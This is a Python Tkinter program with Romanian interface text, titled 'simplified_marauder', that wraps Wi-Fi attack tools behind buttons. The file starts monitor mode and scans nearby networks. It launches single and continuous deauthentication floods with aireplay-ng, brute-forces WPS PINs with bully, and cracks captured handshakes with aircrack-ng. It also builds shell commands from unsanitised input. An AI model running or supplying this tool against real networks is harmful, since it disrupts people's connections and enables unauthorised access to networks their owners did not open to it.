import os
import tkinter as tk
from tkinter import messagebox, filedialog, scrolledtext
from threading import Thread
import subprocess
import time
import random
import string

scanning = False

def generate_filename():
    return f"/tmp/networks_{''.join(random.choices(string.ascii_letters + string.digits, k=6))}-01.csv"

def start_monitor():
    global scanning
    interface = interface_entry.get().strip()
    if not interface:
        messagebox.showerror("error", "introdu o interfata valida")
        return
    os.system(f"airmon-ng start {interface}")
    output_text.insert(tk.END, "[info] monitor mode pornit\n")
    scanning = True
    Thread(target=scan_networks, args=(interface,)).start()

def stop_monitor():
    global scanning
    interface = interface_entry.get().strip()
    if interface:
        scanning = False
        os.system(f"airmon-ng stop {interface}mon")
        output_text.insert(tk.END, "[info] monitor mode oprit\n")
        network_listbox.delete(0, tk.END)
    else:
        messagebox.showerror("error", "introdu o interfata valida")

def scan_networks(interface):
    network_listbox.delete(0, tk.END)
    while scanning:
        csv_file = generate_filename()
        os.system(f"timeout 2 airodump-ng {interface}mon -w {csv_file} --output-format csv")
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
        except FileNotFoundError:
            time.sleep(1)
            continue
        for line in lines[2:]:
            if line.strip():
                parts = line.split(',')
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    network_str = f"{essid} ({bssid}) - canal {channel}"
                    existing = network_listbox.get(0, tk.END)
                    if network_str not in existing:
                        network_listbox.insert(tk.END, network_str)
        time.sleep(1)

def select_network(event):
    selection = event.widget.curselection()
    if not selection:
        return
    index = selection[0]
    selected_item = event.widget.get(index)
    try:
        essid_part, remainder = selected_item.split(" (", 1)
        bssid_part, channel_part = remainder.split(") - canal ")
        selected_essid.set(essid_part.strip())
        selected_bssid.set(bssid_part.strip())
        selected_channel.set(channel_part.strip())
        output_text.insert(tk.END, f"[info] selectat: {selected_essid.get()} | bssid: {selected_bssid.get()} | channel: {selected_channel.get()}\n")
    except Exception as e:
        messagebox.showerror("error", f"eroare la selectarea retelei: {str(e)}")

def execute_command(command):
    output_text.insert(tk.END, f"[exec] {command}\n")
    def run_command():
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
            for line in iter(process.stdout.readline, ""):
                output_text.insert(tk.END, line)
                output_text.see(tk.END)
            process.stdout.close()
            process.wait()
        except Exception as e:
            output_text.insert(tk.END, f"error: {str(e)}\n")
    Thread(target=run_command).start()

def attack_deauth():
    bssid = selected_bssid.get()
    interface = interface_entry.get().strip()
    if bssid and interface:
        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface}mon")
    else:
        messagebox.showerror("error", "selecteaza o retea valida pentru atac deauth")

def continuous_deauth():
    bssid = selected_bssid.get()
    interface = interface_entry.get().strip()
    if bssid and interface:
        output_text.insert(tk.END, "[info] atac deauth flood continuu lansat...\n")
        def flood():
            os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}mon")
        Thread(target=flood, daemon=True).start()
    else:
        messagebox.showerror("error", "selecteaza o retea valida pentru atac deauth")

def stop_deauth():
    output_text.insert(tk.END, "[info] atac deauth flood oprit\n")
    os.system("killall aireplay-ng")

def brute_force_wps():
    bssid = selected_bssid.get()
    channel = selected_channel.get()
    if bssid and channel:
        execute_command(f"bully -b {bssid} -c {channel} -v")
    else:
        messagebox.showerror("error", "selecteaza o retea valida pentru atac wps")

def crack_handshake():
    cap_file = filedialog.askopenfilename(filetypes=[("fisiere captura", "*.cap")])
    wordlist = filedialog.askopenfilename(filetypes=[("fisiere text", "*.txt")])
    if cap_file and wordlist:
        execute_command(f"aircrack-ng -w {wordlist} {cap_file}")
    else:
        messagebox.showerror("error", "selecteaza fisierul de captura si wordlist-ul")

root = tk.Tk()
root.title("simplified_marauder")
root.geometry("1200x700")
root.configure(bg="black")

top_frame = tk.Frame(root, bg="black")
top_frame.pack(side=tk.TOP, fill=tk.X, padx=20, pady=10)

tk.Label(top_frame, text="interfata wi-fi:", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
interface_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white")
interface_entry.pack(side=tk.LEFT, padx=5)
tk.Button(top_frame, text="porneste monitor mode", command=start_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)
tk.Button(top_frame, text="opreste monitor mode", command=stop_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)

middle_frame = tk.Frame(root, bg="black")
middle_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=20, pady=10)

left_frame = tk.Frame(middle_frame, bg="black")
left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)
tk.Label(left_frame, text="live comenzi & output", bg="black", fg="white").pack(anchor="w")
output_text = scrolledtext.ScrolledText(left_frame, bg="black", fg="white")
output_text.pack(fill=tk.BOTH, expand=True)

right_frame = tk.Frame(middle_frame, bg="black")
right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10)
tk.Label(right_frame, text="retele disponibile", bg="black", fg="white").pack(anchor="w")
network_listbox = tk.Listbox(right_frame, bg="black", fg="white")
network_listbox.pack(fill=tk.BOTH, expand=True)
network_listbox.bind("<<ListboxSelect>>", select_network)

bottom_frame = tk.Frame(root, bg="black")
bottom_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)

buttons = [
    ("atac deauth", attack_deauth),
    ("deauth flood continuu", continuous_deauth),
    ("opreste deauth", stop_deauth),
    ("brute-force wps", brute_force_wps),
    ("sparge handshake", crack_handshake)
]

# Create the buttons in a grid layout of 3 rows and 4 buttons per row
for i, (text, cmd) in enumerate(buttons):
    row = i // 4  # Determines the row number (integer division by 4)
    column = i % 4  # Determines the column number (remainder of division by 4)
    tk.Button(bottom_frame, text=text, command=cmd, bg="black", fg="white").grid(row=row, column=column, padx=5, pady=5)

selected_bssid = tk.StringVar()
selected_essid = tk.StringVar()
selected_channel = tk.StringVar()

root.mainloop()
